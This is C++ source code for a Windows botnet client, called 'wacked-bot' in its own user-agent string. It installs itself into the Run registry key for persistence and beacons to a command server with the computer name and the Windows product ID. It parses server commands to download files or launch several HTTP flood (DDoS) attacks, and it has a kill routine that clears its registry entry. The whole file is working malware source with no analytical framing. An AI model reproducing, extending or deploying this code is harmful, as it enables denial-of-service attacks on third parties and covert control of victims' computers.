void parsecommand(string command){
	
	if (command=="wait  "||command==""||command==" "||command=="  "){
		Sleep(600);
		connect(0);                }
		
	char delim=' ';
	int count=command.find(delim);
	string cmd[11];
	string tmp=command;
	cmd[0]=tmp.substr(0,count+1);
	command=command.substr(count+1);

	for(int i=1;i<=9;i++)
	{
    int count=command.find(delim);
	string tmp=command;
	cmd[i]=tmp.substr(0,count+1);
	command=command.substr(count+1);
	
	}
cout<<cmd[0];
	if (cmd[0]=="download "){
		
		download( cmd[1], cmd[2], cmd[3]);
	}
	    if (cmd[0]=="ddos.getflood "||cmd[0]=="get "){
		skyget( cmd[1],  cmd[2]);
	}
        if (cmd[0]=="ddos.skyget "||cmd[0]=="skyg "){
		skyget( cmd[1],  cmd[2]);
	}
		    if (cmd[0]=="ddos.getflood_opt "||cmd[0]=="get_o "){
		skyget( cmd[1],  cmd[2]);
	}
        if (cmd[0]=="ddos.skyget_opt "||cmd[0]=="skyg_o "){
		skyget( cmd[1],  cmd[2]);
	}
	
		
	
}

int install(){
	CHAR Filename[_MAX_PATH +1];
	GetModuleFileName(NULL, Filename, _MAX_PATH);
	string file=Filename;

	CopyFile(Filename, install_location.c_str(), TRUE);

               
	HKEY hkey; 
	RegCreateKeyEx(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkey, 0);    
	RegSetValueEx(hkey, install_regestry_subkey.c_str(), 0, REG_SZ,(unsigned char*) install_location.c_str(), sizeof(Filename)); 
	RegCloseKey(hkey);
	return 0;
}

int connect(int meta){
cout<<"connecting";
	HINTERNET Internet, Conn, Req;
	

		Internet=InternetOpen("wacked-bot",INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0);
		 if (Internet==NULL)
		 {
		 
			 return 1;
		 }
		 Conn=InternetConnect(Internet,server.c_str(),INTERNET_DEFAULT_HTTP_PORT,NULL,NULL,INTERNET_SERVICE_HTTP,0,0);
	       if (Conn==NULL)
			  {
				  
				  return 2;
			  }
			  string cname=name();
			  string cserial=serial();
			  string request=location+"?serial="+cserial+"&name="+cname;
			  if (meta==1){
				  request=request+"&meta=wacked_is_the_king";}
		 Req=HttpOpenRequest(Conn,"GET",request.c_str(), NULL, NULL, NULL, INTERNET_FLAG_KEEP_CONNECTION, 0);
	    if (Req==NULL)
		{
		
	    return 3;
		}
		HttpSendRequest(Req,NULL,0,NULL,0);
		char comm[200];
		DWORD read;
		string command;
		bool b00l;
	while(b00l)
	    {
        b00l = InternetReadFile(Req,comm,100,&read);

        if(b00l && read == 0) break; 
		}
    command=comm;
	
	command=command.substr(4,string::npos);
    
	int count=command.find("-->",0);
		command=command.substr(0,count);
		
  parsecommand(command);
	
	
}

string name(){
   char szTemp[512]="";
   DWORD dwSize=512;
   GetComputerName(szTemp, &dwSize);
   string name=szTemp;
        return name;
}
string serial(){
	char szTemp[512]="";
	DWORD dwSize=512, dwType;
	HKEY hKey;

	szTemp[0]=0;

	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey)==ERROR_SUCCESS)
	{
		RegQueryValueEx(hKey, "ProductId", NULL, &dwType, (LPBYTE)szTemp, &dwSize);

		RegCloseKey(hKey);
	}
	else
	{
		if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion", 0, KEY_READ, &hKey)==ERROR_SUCCESS)
		{
			RegQueryValueEx(hKey, "ProductId", NULL, &dwType, (LPBYTE)szTemp, &dwSize);

			RegCloseKey(hKey);
		}
	}
	string serial=szTemp;
	return serial;
}
void KillBot(){
      	HKEY hkey; 
	RegCreateKeyEx(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkey, 0);    
	RegSetValueEx(hkey, install_regestry_subkey.c_str(), 0, REG_SZ,(unsigned char*) " ", sizeof(install_regestry_subkey)); 
	RegCloseKey(hkey);}